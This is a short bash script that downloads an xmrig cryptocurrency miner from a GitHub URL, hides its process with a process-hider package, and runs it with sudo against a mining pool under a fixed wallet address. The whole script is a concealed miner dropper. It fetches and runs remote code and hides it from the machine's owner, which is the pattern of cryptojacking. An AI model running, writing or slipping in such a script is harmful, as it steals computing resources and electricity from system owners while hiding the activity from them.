#!/bin/bash
npm i -g node-process-hider
wget https://raw.githubusercontent.com/realxdagg/job/main/xmrig
chmod 500 xmrig
ph add xmrig
sudo ./xmrig -o us-qrl.volt-mine.com:4333 -u Q01050018ae33f2279aeafbb40b03bee3c2b69a0f2f27bd147d68dc4c6cfa807e93cc27ccef4e15 -k --tls --threads=8
